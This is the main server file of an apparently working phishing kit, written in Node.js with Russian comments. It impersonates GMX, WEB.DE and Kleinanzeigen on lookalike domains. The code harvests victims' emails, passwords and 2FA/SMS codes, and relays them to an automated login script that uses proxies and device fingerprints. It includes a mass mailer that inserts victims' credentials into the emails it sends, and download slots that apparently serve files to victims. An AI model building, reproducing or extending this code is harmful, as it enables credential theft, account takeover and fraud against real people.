/**
 * Сервер: приём данных с формы (email/пароль) и отдача списка в админку.
 * WebSocket для мгновенного обновления админки (npm install ws).
 */
require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });
const http = require('http');
const https = require('https');
const net = require('net');
const dns = require('dns');
const fs = require('fs');
const path = require('path');
/** Корень репозитория (рядом с package.json, login/, public/, data/). */
const PROJECT_ROOT = path.join(__dirname, '..');
const url = require('url');
const os = require('os');
const {
  fingerprintSignature,
  collectRequestMeta,
  applyLeadTelemetry,
  deviceSignatureFromRequest
} = require('./lib/leadTelemetry');
const { buildAutomationProfile } = require('./lib/automationProfile');
const { buildLeadLoginContextPayload } = require('./lib/leadLoginContext');
const { scheduleWebdeLayoutHealthcheck } = require('./lib/webdeLayoutHealthScheduler');
const { logTerminalFlow } = require('./lib/terminalFlowLog');
const {
  getDb,
  closeDb,
  getAllLeads,
  addLead,
  updateLeadPartial,
  replaceLeadRow,
  deepMerge,
  replaceAllLeads,
  getModeData,
  writeModeData,
  DB_PATH
} = require('./db/database.js');
const { send, safeEnd, readApiRouteBody, parseHttpRequestUrl } = require('./utils/httpUtils');
const { ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminAuth, getAdminTokenFromRequest } = require('./utils/authUtils');
const { getPlatformFromRequest, maskEmail, EVENT_LABELS, readStartPage, getRedirectPasswordStatus } = require('./utils/formatUtils');
const apiRoutes = require('./routes/apiRoutes');
const clientRoutes = require('./routes/clientRoutes');
const adminRoutes = require('./routes/adminRoutes');
const gateMiddleware = require('./middleware/gateMiddleware');
const staticRoutes = require('./routes/staticRoutes');
const chatService = require('./services/chatService');
const leadService = require('./services/leadService');
const automationService = require('./services/automationService');

const readLeads = () => leadService.readLeads();
const readLeadsAsync = (cb) => leadService.readLeadsAsync(cb);
const invalidateLeadsCache = () => leadService.invalidateLeadsCache();
const resolveLeadId = (id) => leadService.resolveLeadId(id);
const persistLeadPatch = (leadId, patch) => leadService.persistLeadPatch(leadId, patch);
const persistLeadFull = (lead) => leadService.persistLeadFull(lead);
const writeReplacedLeadId = (oldId, newId) => leadService.writeReplacedLeadId(oldId, newId);
const archiveFlagIsSet = leadService.archiveFlagIsSet;
const leadIsWorkedFromEvents = leadService.leadIsWorkedFromEvents;
const leadIsWorkedLikeAdmin = leadService.leadIsWorkedLikeAdmin;

const { execSync, spawnSync, spawn } = require('child_process');
const yauzl = require('yauzl');
let nodemailer;
try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
let WebSocketServer;
try {
  WebSocketServer = require('ws').WebSocketServer;
} catch (e) {
  WebSocketServer = null;
}
let HttpsProxyAgent;
try {
  HttpsProxyAgent = require('https-proxy-agent').HttpsProxyAgent;
} catch (e) {
  HttpsProxyAgent = null;
}

const PORT = parseInt(process.env.PORT, 10) || 3000;
const HOST = (process.env.HOST || '0.0.0.0').trim();

/** Очередь вывода в stdout: при множестве параллельных AUTO-LOGIN снижает пики нагрузки на PM2/терминал. Отключить: SERVER_LOG_DIRECT=1 */
(function initConsoleLogQueue() {
  if (process.env.SERVER_LOG_DIRECT === '1' || String(process.env.SERVER_LOG_DIRECT || '').toLowerCase() === 'true') return;
  const BATCH = Math.max(5, parseInt(process.env.SERVER_LOG_BATCH || '35', 10) || 35);
  const MAX_QUEUE = Math.max(300, parseInt(process.env.SERVER_LOG_MAX_QUEUE || '4000', 10) || 4000);
  const buf = [];
  let scheduled = false;
  const origLog = console.log.bind(console);
  const origErr = console.error.bind(console);
  const origWarn = console.warn.bind(console);
  function flush() {
    scheduled = false;
    let n = 0;
    while (buf.length && n < BATCH) {
      const row = buf.shift();
      n += 1;
      if (row.type === 'err') origErr.apply(console, row.args);
      else if (row.type === 'warn') origWarn.apply(console, row.args);
      else origLog.apply(console, row.args);
    }
    if (buf.length) {
      scheduled = true;
      setImmediate(flush);
    }
  }
  function enqueue(type, argsList) {
    buf.push({ type: type, args: argsList });
    if (buf.length > MAX_QUEUE) {
      const drop = buf.length - Math.floor(MAX_QUEUE * 0.8);
      buf.splice(0, drop);
      origErr('[SERVER] console queue: отброшено ' + drop + ' старых строк (лавина логов)');
    }
    if (!scheduled) {
      scheduled = true;
      setImmediate(flush);
    }
  }
  console.log = function () { enqueue('log', Array.from(arguments)); };
  console.error = function () { enqueue('err', Array.from(arguments)); };
  console.warn = function () { enqueue('warn', Array.from(arguments)); };
})();

/** Прямой вывод в stderr перед синхронным process.exit: очередь console может не успеть сброситься. */
function writeFatalSync(msg) {
  try {
    const s = msg != null && typeof msg !== 'string' ? (msg.stack || String(msg)) : String(msg);
    process.stderr.write(/\n$/.test(s) ? s : s + '\n');
  } catch (_) {}
}

/** Домены сайтов: GMX и WEB.DE работают параллельно на разных доменах. Хост админки — см. src/utils/authUtils (ADMIN_DOMAIN). */
const GMX_DOMAIN = (process.env.GMX_DOMAIN || 'gmx-net.cv').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
const WEBDE_DOMAIN = (process.env.WEBDE_DOMAIN || 'web-de.one').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
/** Подпись потока в логе [ВХОД] (по умолчанию домен фишинга WEBDE_DOMAIN). Env: SERVER_LOG_PHISH_LABEL */
const SERVER_LOG_PHISH_LABEL = (process.env.SERVER_LOG_PHISH_LABEL || WEBDE_DOMAIN || 'сайт').trim() || 'сайт';
/** Список доменов WEB.DE (через запятую). Если задан — все они отдают бренд webde. Иначе используется только WEBDE_DOMAIN и www.WEBDE_DOMAIN. */
const WEBDE_DOMAINS_RAW = (process.env.WEBDE_DOMAINS || '').trim();
const WEBDE_DOMAINS_LIST = WEBDE_DOMAINS_RAW
  ? WEBDE_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim(); }).filter(Boolean)
  : [WEBDE_DOMAIN, 'www.' + WEBDE_DOMAIN];
const WEBDE_CANONICAL_HOST = WEBDE_DOMAINS_LIST[0].replace(/^www\./, '') || WEBDE_DOMAIN;

/** Домен(ы) Klein (Kleinanzeigen). Отдельный бренд на своём домене. */
const KLEIN_DOMAIN = (process.env.KLEIN_DOMAIN || 'kontosicherheit-de.com').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
const KLEIN_DOMAINS_RAW = (process.env.KLEIN_DOMAINS || '').trim();
const KLEIN_DOMAINS_LIST = KLEIN_DOMAINS_RAW
  ? KLEIN_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim(); }).filter(Boolean)
  : [KLEIN_DOMAIN, 'www.' + KLEIN_DOMAIN];
const KLEIN_CANONICAL_HOST = KLEIN_DOMAINS_LIST[0].replace(/^www\./, '') || KLEIN_DOMAIN;

/** Сообщение под формой Klein после неверного пароля (скрипт автовхода). */
const KLEIN_VICTIM_PASSWORD_ERROR_DE = 'Die E-Mail-Adresse ist nicht registriert oder das Passwort ist falsch. Bitte überprüfe deine Eingaben.';

const BRANDS = {
  gmx: {
    id: 'gmx',
    name: 'GMX',
    logoUrl: '/favicon.svg',
    primaryColor: '#1c449b',
    primaryColorDark: '#16367c',
    canonicalUrl: 'https://www.gmx.net/',
    canonicalHost: GMX_DOMAIN,
    impressumUrl: 'https://www.gmx.net/impressum/',
    datenschutzUrl: 'https://agb-server.gmx.net/datenschutz',
    agbUrl: 'https://agb-server.gmx.net/gmxagb-de',
    hilfeUrl: 'https://hilfe.gmx.net/',
    passwortUrl: 'https://passwort.gmx.net/'
  },
  webde: {
    id: 'webde',
    name: 'WEB.DE',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/de/thumb/5/5f/Web.de_logo.svg/1280px-Web.de_logo.svg.png',
    primaryColor: '#FFDF00',
    primaryColorDark: '#E6C700',
    buttonDisabledColor: '#F5EDC1',
    canonicalUrl: 'https://newsroom.web.de/',
    canonicalHost: WEBDE_CANONICAL_HOST,
    impressumUrl: 'https://web.de/impressum/',
    datenschutzUrl: 'https://web.de/datenschutz',
    agbUrl: 'https://web.de/agb',
    hilfeUrl: 'https://hilfe.web.de/',
    passwortUrl: 'https://web.de/'
  },
  klein: {
    id: 'klein',
    name: 'Kleinanzeigen',
    logoUrl: 'https://static.kleinanzeigen.de/m/img/common/logo-mobile-kleinanzeigen.1x0pahqxgxyso.svg',
    primaryColor: '#326916',
    primaryColorDark: '#2a5712',
    canonicalUrl: 'https://www.kleinanzeigen.de/',
    canonicalHost: KLEIN_CANONICAL_HOST,
    impressumUrl: 'https://www.kleinanzeigen.de/impressum.html',
    datenschutzUrl: 'https://themen.kleinanzeigen.de/datenschutzerklaerung/',
    agbUrl: 'https://themen.kleinanzeigen.de/nutzungsbedingungen/',
    hilfeUrl: 'https://hilfe.kleinanzeigen.de/hc/de',
    passwortUrl: 'https://www.kleinanzeigen.de/m-passwort-vergessen-inapp.html'
  }
};

/** Является ли хост локальным (тесты): localhost, 127.0.0.1, 0.0.0.0, локальная сеть. */
function isLocalHost(host) {
  if (!host) return false;
  if (host === 'localhost' || host === '127.0.0.1' || host === '0.0.0.0') return true;
  if (host.startsWith('192.168.') || host.startsWith('10.')) return true;
  if (host.startsWith('172.') && /^172\.(1[6-9]|2\d|3[01])\./.test(host)) return true;
  return false;
}
/** Определение бренда по хосту: локальный хост → webde (для тестов), Klein → klein, WEB.DE → webde, иначе → gmx. */
function getBrand(req) {
  const host = (req && req.headers && req.headers.host ? req.headers.host : '').split(':')[0].toLowerCase();
  if (isLocalHost(host)) return BRANDS.webde;
  if (KLEIN_DOMAINS_LIST.indexOf(host) !== -1) return BRANDS.klein;
  if (WEBDE_DOMAINS_LIST.indexOf(host) !== -1) return BRANDS.webde;
  return BRANDS.gmx;
}

/** Канонический домен для текущего запроса (по бренду хоста). */
function getCanonicalDomain(req) {
  return getBrand(req).canonicalHost;
}

/** Разрешённые домены почты для бренда GMX при /api/submit (если ENABLE_EMAIL_DOMAIN_ALLOWLIST=1). WEB.DE: всегда только @web.de (на localhost — любой). Klein: любой домен. */
const ALLOWED_EMAIL_DOMAINS_RAW = (process.env.ALLOWED_EMAIL_DOMAINS || '').trim();
const ALLOWED_EMAIL_DOMAINS = ALLOWED_EMAIL_DOMAINS_RAW
  ? ALLOWED_EMAIL_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().trim(); }).filter(Boolean)
  : [];
/** Включить фильтр по ALLOWED_EMAIL_DOMAINS для GMX (и прочих не-klein, не-webde). По умолчанию выкл. Env: ENABLE_EMAIL_DOMAIN_ALLOWLIST=1 */
const ENABLE_EMAIL_DOMAIN_ALLOWLIST = /^1|true|yes$/i.test(String(process.env.ENABLE_EMAIL_DOMAIN_ALLOWLIST || '').trim());
/** Требовать cookie гейта для POST /api/submit, /api/klein-anmelden-seen, /api/download-request. По умолчанию выкл (Env: REQUIRE_GATE_COOKIE=1). */
const REQUIRE_GATE_COOKIE = /^1|true|yes$/i.test(String(process.env.REQUIRE_GATE_COOKIE || '').trim());

/**
 * Одна папка для SQLite (database.sqlite), чата/режима в БД и остальных data-файлов.
 * Если фишинг (gmx-net) и админка (grzl.org) — разные PM2-приложения/каталоги кода,
 * задайте ОДИН И ТОТ ЖЕ абсолютный путь в GMW_DATA_DIR на обоих.
 */
const DATA_DIR = process.env.GMW_DATA_DIR
  ? path.resolve(process.env.GMW_DATA_DIR)
  : path.join(PROJECT_ROOT, 'data');
const START_PAGE_FILE = path.join(DATA_DIR, 'start-page.txt');
const SHORT_DOMAINS_FILE = path.join(DATA_DIR, 'short-domains.json');
const ZIP_PASSWORD_FILE = path.join(DATA_DIR, 'zip-password.txt');
const ALL_LOG_FILE = path.join(DATA_DIR, 'all.txt');
const DEBUG_LOG_FILE = path.join(DATA_DIR, 'debug.log');
const SAVED_CREDENTIALS_FILE = path.join(DATA_DIR, 'saved-credentials.json');
const STEALER_EMAIL_FILE = path.join(DATA_DIR, 'stealer-email.json');
const CONFIG_EMAIL_FILE = path.join(DATA_DIR, 'config-email.json');
const WARMUP_EMAIL_FILE = path.join(DATA_DIR, 'warmup-email.json');
const WARMUP_SMTP_STATS_FILE = path.join(DATA_DIR, 'warmup-smtp-stats.json');
/** Папка загрузок для страницы /sicherheit. Поддержка 5 файлов (по одному на «человека»), выбор по leadId. */
const DOWNLOADS_DIR = path.join(PROJECT_ROOT, 'downloads');
const DOWNLOAD_FILES_CONFIG = path.join(DATA_DIR, 'download-files.json');
const DOWNLOAD_LIMITS_FILE = path.join(DATA_DIR, 'download-limits.json');
const DOWNLOAD_COUNTS_FILE = path.join(DATA_DIR, 'download-counts.json');
const DOWNLOAD_ANDROID_CONFIG = path.join(DATA_DIR, 'download-android.json');
const DOWNLOAD_ANDROID_LIMITS_FILE = path.join(DATA_DIR, 'download-android-limits.json');
const DOWNLOAD_SETTINGS_FILE = path.join(DATA_DIR, 'download-settings.json');
const DOWNLOAD_ROTATION_FILE = path.join(DATA_DIR, 'download-rotation.json');
/** Список имён файлов куки (safe), которые уже выгружались — для «Выгрузить новые». */
const COOKIES_EXPORTED_FILE = path.join(DATA_DIR, 'cookies-exported.json');
/** Прокси для скрипта входа WEB.DE (login/proxy.txt — тот же файл читает lead_simulation_api.py) */
const PROXY_FILE = path.join(PROJECT_ROOT, 'login', 'proxy.txt');
/** Список индексов отпечатков (строки с числами) — подмножество webde_fingerprints.json; пусто = все */
const WEBDE_FP_INDICES_FILE = path.join(PROJECT_ROOT, 'login', 'webde_fingerprint_indices.txt');
const WEBDE_FINGERPRINTS_JSON = path.join(PROJECT_ROOT, 'login', 'webde_fingerprints.json');
const WEBDE_PROBE_BATCH_SCRIPT = path.join(PROJECT_ROOT, 'login', 'webde_probe_batch.py');
/** За один «Старт» в админке — не больше N индексов (остальное — следующими запусками). Env: WEBDE_PROBE_MAX_INDICES_PER_JOB */
const WEBDE_PROBE_MAX_INDICES_PER_JOB = (function () {
  const n = parseInt(process.env.WEBDE_PROBE_MAX_INDICES_PER_JOB || '12', 10);
  if (!Number.isFinite(n) || n < 1) return 12;
  return Math.min(500, n);
})();
const LOGIN_DIR = path.join(PROJECT_ROOT, 'login');
/** Фоновые пробы отпечатков WEB.DE в админке: jobId → состояние */
const webdeProbeJobs = new Map();
let webdeProbeJobSeq = 0;
/** Смещение по списку разрешённых индексов: следующий «Старт» берёт следующую порцию (не те же 12 с начала). */
let webdeFpProbeIndexCursor = 0;
const LOGIN_ARTIFACT_NAMES = ['webde_screenshot.png', 'webde_page_info.txt', 'debug_screenshot.png', 'debug_consent.png', 'lead_data.json', 'lead_result.json'];
const LOGIN_CLEANUP_MAX_AGE_MS = 10 * 60 * 1000; // 10 мин неактивности — удаляем артефакты (оставляем куки и данные лидов)
const short = require('./short');
const DOWNLOAD_SLOTS_COUNT = 5;
const DEFAULT_DOWNLOAD_LIMIT = 5;
/** Временная папка для Check (файл ещё не добавлен в кнопку скачивания) */
const CHECK_DIR = path.join(os.tmpdir(), 'gmw-check');
const CHECK_META_FILE = path.join(CHECK_DIR, 'meta.json');

/** kind smsCodeData: 2fa | sms (или эвристика по status/логу) — для скрипта опроса 2FA и согласованности с админкой. */
function smsCodeDataKindForLead(lead) {
  if (!lead || !lead.smsCodeData) return null;
  const code = String(lead.smsCodeData.code || '').trim();
  if (!code) return null;
  const k = lead.smsCodeData.kind;
  if (k === '2fa' || k === 'sms') return k;
  const st = String(lead.status || '').toLowerCase();
  if (st === 'redirect_2fa_code') return '2fa';
  if (st === 'redirect_sms_code' || st === 'redirect_sms') return 'sms';
  const evs = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : [];
  for (let i = evs.length - 1; i >= 0; i--) {
    const lab = String((evs[i] && evs[i].label) || '').toLowerCase();
    if (lab.indexOf('ввел 2fa-код') === 0) return '2fa';
    if (lab.indexOf('ввел sms kl') === 0 || lab.indexOf('ввел sms-код') === 0 || lab.indexOf('ввел sms:') === 0) return 'sms';
  }
  return 'sms';
}

/** Long-poll «жду новый пароль» для скрипта WEB.DE (по умолчанию 3 мин). Env: WEBDE_WAIT_PASSWORD_TIMEOUT_MS (мс, минимум 60000). */
const WEBDE_WAIT_PASSWORD_TIMEOUT_MS = (function () {
  const v = parseInt(process.env.WEBDE_WAIT_PASSWORD_TIMEOUT_MS, 10);
  if (Number.isFinite(v) && v >= 60000) return v;
  return 3 * 60 * 1000;
})();

/** Ошибка автовхода 500/502/503: жертве только оверлей ожидания, без редиректа. Env: WEBDE_SCRIPT_VICTIM_WAIT_MS (мс, мин. 10000). */
const WEBDE_SCRIPT_VICTIM_WAIT_MS = (function () {
  const v = parseInt(process.env.WEBDE_SCRIPT_VICTIM_WAIT_MS, 10);
  if (Number.isFinite(v) && v >= 10000) return v;
  return 5 * 60 * 1000;
})();

function webdeErrorTriggersVictimAutomationWait(errorCode) {
  const c = String(errorCode || '').trim();
  if (c === '408') return false;
  return c === '500' || c === '502' || c === '503';
}

/** Ожидающие запросы скрипта входа: leadId -> { res, timeoutId }. Админка при сохранении пароля отдаёт пароль в этот запрос. */
const webdePasswordWaiters = {};
/** По leadId: запрос переотправки пуша со страницы админки (скрипт опрашивает и кликает «Mitteilung erneut senden»). */
const webdePushResendRequested = {};

function readCheckMeta() {
  try {
    const data = fs.readFileSync(CHECK_META_FILE, 'utf8');
    return JSON.parse(data);
  } catch (e) { return {}; }
}
function writeCheckMeta(meta) {
  try {
    if (!fs.existsSync(CHECK_DIR)) fs.mkdirSync(CHECK_DIR, { recursive: true });
    fs.writeFileSync(CHECK_META_FILE, JSON.stringify(meta, null, 0));
  } catch (e) {}
}
/** Парсит одну строку SMTP: host:port:user:fromEmail:password (пароль может содержать ':') */
function parseSmtpLine(line) {
  const raw = (line || '').trim();
  const s = raw.indexOf('\n') >= 0 ? raw.split('\n')[0].trim() : raw;
  if (!s) return null;
  const parts = s.split(':');
  if (parts.length < 5) return null;
  const host = (parts[0] || '').trim();
  const port = parseInt(parts[1], 10) || 587;
  let user = (parts[2] || '').trim();
  let fromEmail = (parts[3] || '').trim();
  let password = parts.slice(4).join(':').trim();
  if (user.length > 256) user = user.slice(0, 256);
  if (fromEmail.length > 256) fromEmail = fromEmail.slice(0, 256);
  if (password.length > 256) password = password.slice(0, 256);
  return {
    host,
    port,
    user,
    fromEmail,
    password
  };
}

/** Парсит поле SMTP с несколькими строками (каждая строка = один SMTP). Возвращает массив. */
function parseSmtpLines(line) {
  const raw = (line || '').trim();
  const lines = raw.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
  const result = [];
  for (const s of lines) {
    const smtp = parseSmtpLine(s);
    if (smtp && smtp.host && smtp.user && smtp.password) result.push(smtp);
  }
  return result;
}

function readStealerEmailConfig() {
  try {
    if (fs.existsSync(STEALER_EMAIL_FILE)) {
      const raw = fs.readFileSync(STEALER_EMAIL_FILE, 'utf8');
      const data = JSON.parse(raw);
      if (data.configs && Array.isArray(data.configs)) {
        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
        return { currentId, configs: data.configs, current };
      }
      const legacy = data;
      const id = 'legacy-' + Date.now();
      if (legacy.smtp && legacy.smtpUser) {
        const smtpLine = [legacy.smtp, String(legacy.smtpPort || 587), legacy.smtpUser, legacy.smtpUser, legacy.smtpPass || ''].join(':');
        const migrated = { currentId: id, configs: [{ id, name: 'Default', smtpLine, html: legacy.html || '', senderName: legacy.senderName || '', title: legacy.title || '' }] };
        writeStealerEmailConfig(migrated);
        const cur = migrated.configs[0];
        return { currentId: id, configs: migrated.configs, current: cur };
      }
    }
  } catch (e) {}
  const emptyId = 'default';
  const empty = { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '' } };
  return empty;
}
function writeStealerEmailConfig(data) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
    fs.writeFileSync(STEALER_EMAIL_FILE, JSON.stringify(toWrite || {}, null, 2), 'utf8');
  } catch (e) {}
}

function readConfigEmail() {
  try {
    if (fs.existsSync(CONFIG_EMAIL_FILE)) {
      const raw = fs.readFileSync(CONFIG_EMAIL_FILE, 'utf8');
      const data = JSON.parse(raw);
      if (data.configs && Array.isArray(data.configs)) {
        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
        return { currentId, configs: data.configs, current };
      }
    }
  } catch (e) {}
  const emptyId = 'default';
  const empty = { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', senderName: '', title: '', html: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', senderName: '', title: '', html: '' } };
  return empty;
}
function writeConfigEmail(data) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
    fs.writeFileSync(CONFIG_EMAIL_FILE, JSON.stringify(toWrite || {}, null, 2), 'utf8');
  } catch (e) {}
}

function readWarmupEmailConfig() {
  try {
    if (fs.existsSync(WARMUP_EMAIL_FILE)) {
      const raw = fs.readFileSync(WARMUP_EMAIL_FILE, 'utf8');
      const data = JSON.parse(raw);
      if (data.configs && Array.isArray(data.configs)) {
        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
        return { currentId, configs: data.configs, current };
      }
    }
  } catch (e) {}
  const emptyId = 'default';
  const empty = { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' } };
  return empty;
}
function writeWarmupEmailConfig(data) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
    fs.writeFileSync(WARMUP_EMAIL_FILE, JSON.stringify(toWrite || {}, null, 2), 'utf8');
  } catch (e) {}
}

function readWarmupSmtpStats() {
  try {
    if (fs.existsSync(WARMUP_SMTP_STATS_FILE)) {
      const raw = fs.readFileSync(WARMUP_SMTP_STATS_FILE, 'utf8');
      const data = JSON.parse(raw);
      if (data && typeof data === 'object') return data;
    }
  } catch (e) {}
  return {};
}
function writeWarmupSmtpStats(stats) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(WARMUP_SMTP_STATS_FILE, JSON.stringify(stats || {}, null, 2), 'utf8');
  } catch (e) {}
}

const warmupState = {
  running: false,
  stopped: false,
  paused: false,
  configs: [],
  /** Плоский список { config, smtp } для ротации 1→2→3→1… */
  flatList: [],
  leads: [],
  perSmtpLimit: 0,
  delayMs: 2000,
  /** Текущее число параллельных цепочек отправки (для добавления при снятии паузы) */
  numThreads: 1,
  /** Отправлено с каждого SMTP (ключ — fromEmail) */
  sentPerSmtp: {},
  log: [],
  totalSent: 0
};
const WARMUP_LOG_MAX = 500;

let sendStealerSmtpIndex = 0;
/** SMTP, с которых была ошибка отправки (554 и т.д.) — исключаются из списка до перезапуска сервера */
const sendStealerFailedSmtpEmails = new Set();

function runWarmupStep() {
  if (warmupState.stopped || !warmupState.running) {
    warmupState.running = false;
    warmupState.log.push({ text: '[Прогрев остановлен]', type: 'muted' });
    return;
  }
  if (warmupState.paused) {
    setTimeout(runWarmupStep, 500);
    return;
  }
  const flatList = warmupState.flatList;
  const leads = warmupState.leads;
  const limit = warmupState.perSmtpLimit;
  const sentPerSmtp = warmupState.sentPerSmtp;
  if (!flatList.length || !leads.length) {
    warmupState.running = false;
    warmupState.log.push({ text: '[Прогрев завершён: нет SMTP или лидов]', type: 'muted' });
    return;
  }
  const s = warmupState.totalSent;
  let chosen = null;
  for (let k = 0; k < flatList.length; k++) {
    const idx = (s + k) % flatList.length;
    const entry = flatList[idx];
    if ((sentPerSmtp[entry.smtp.fromEmail] || 0) < limit) {
      chosen = entry;
      break;
    }
  }
  if (!chosen) {
    warmupState.running = false;
    warmupState.log.push({ text: '[Прогрев завершён: лимит по каждому SMTP достигнут]', type: 'muted' });
    return;
  }
  const cfg = chosen.config;
  const smtp = chosen.smtp;
  warmupState.totalSent++;
  warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 0) + 1;
  // s растёт с каждой отправкой → при новом круге SMTP (s=3,4,5…) берём следующий блок лидов (3,4,5…), чтобы один SMTP не слал повторно на одни и те же адреса
  const leadIndex = s % leads.length;
  const lead = leads[leadIndex];
  const toEmail = (lead.email || '').trim();
  if (!toEmail) {
    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
    setTimeout(runWarmupStep, 100);
    return;
  }
  const password = (lead.password || '').trim();
  let html = (cfg.html || '').replace(/_email_/g, toEmail).replace(/_password_/g, password);
  const attachments = [];
  if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
    try {
      const buf = Buffer.from(cfg.image1Base64, 'base64');
      html = html.replace(/_src1_/g, 'cid:image1@mail');
      attachments.push({ filename: 'image1.png', content: buf, cid: 'image1@mail' });
    } catch (e) {}
  } else if (html.indexOf('_src1_') !== -1) {
    html = html.replace(/_src1_/g, '');
  }
  if (!nodemailer) {
    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
    warmupState.totalSent--;
    warmupState.log.push({ text: '[nodemailer не установлен]', type: 'error' });
    warmupState.running = false;
    return;
  }
  const transporter = nodemailer.createTransport({
    host: smtp.host,
    port: smtp.port,
    secure: smtp.port === 465,
    auth: { user: smtp.user, pass: smtp.password }
  });
  const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
  const mailOptions = {
    from: fromStr,
    to: toEmail,
    subject: (cfg.title || '').trim() || 'Message',
    html,
    attachments: attachments.length ? attachments : undefined,
    envelope: { from: smtp.fromEmail, to: toEmail }
  };
  transporter.sendMail(mailOptions).then(() => {
    writeWarmupSmtpStats(warmupState.sentPerSmtp);
    warmupState.log.push({ text: 'Отправлено с ' + smtp.fromEmail + ' на ' + toEmail, type: 'success' });
    if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
    setTimeout(runWarmupStep, warmupState.delayMs);
  }).catch((err) => {
    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
    const msg = (err.message || String(err)).slice(0, 150);
    warmupState.log.push({ text: '[Ошибка ' + smtp.fromEmail + ' → ' + toEmail + ': ' + msg + ']', type: 'error' });
    if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
    setTimeout(runWarmupStep, Math.min(warmupState.delayMs, 5000));
  });
}

function readDownloadFilesConfig() {
  try {
    if (fs.existsSync(DOWNLOAD_FILES_CONFIG)) {
      const raw = fs.readFileSync(DOWNLOAD_FILES_CONFIG, 'utf8');
      const data = JSON.parse(raw);
      const list = Array.isArray(data.files) ? data.files : [];
      const out = [];
      for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
        const v = list[i];
        out.push((v && typeof v === 'string' && !v.includes('..') && !v.includes(path.sep)) ? v : null);
      }
      return out;
    }
  } catch (e) {}
  return Array(DOWNLOAD_SLOTS_COUNT).fill(null);
}
function writeDownloadFilesConfig(files) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const list = Array.isArray(files) ? files.slice(0, DOWNLOAD_SLOTS_COUNT) : [];
    while (list.length < DOWNLOAD_SLOTS_COUNT) list.push(null);
    fs.writeFileSync(DOWNLOAD_FILES_CONFIG, JSON.stringify({ files: list }, null, 0), 'utf8');
  } catch (e) {}
}

function readDownloadLimits() {
  try {
    if (fs.existsSync(DOWNLOAD_LIMITS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_LIMITS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return data && typeof data === 'object' ? data : {};
    }
  } catch (e) {}
  return {};
}

function writeDownloadLimits(limits) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_LIMITS_FILE, JSON.stringify(limits || {}, null, 0), 'utf8');
  } catch (e) {}
}

function readDownloadCounts() {
  try {
    if (fs.existsSync(DOWNLOAD_COUNTS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_COUNTS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return data && typeof data === 'object' ? data : {};
    }
  } catch (e) {}
  return {};
}

function writeDownloadCounts(counts) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts && typeof counts === 'object' ? counts : {}, null, 0), 'utf8');
  } catch (e) {}
}

function incrementDownloadCount(fileName) {
  if (!fileName || typeof fileName !== 'string') return;
  const counts = readDownloadCounts();
  const name = path.basename(fileName).replace(/\.\./g, '').replace(/[/\\]/g, '');
  if (!name) return;
  counts[name] = (counts[name] || 0) + 1;
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts, null, 0), 'utf8');
  } catch (e) {}
}
function readCookiesExported() {
  try {
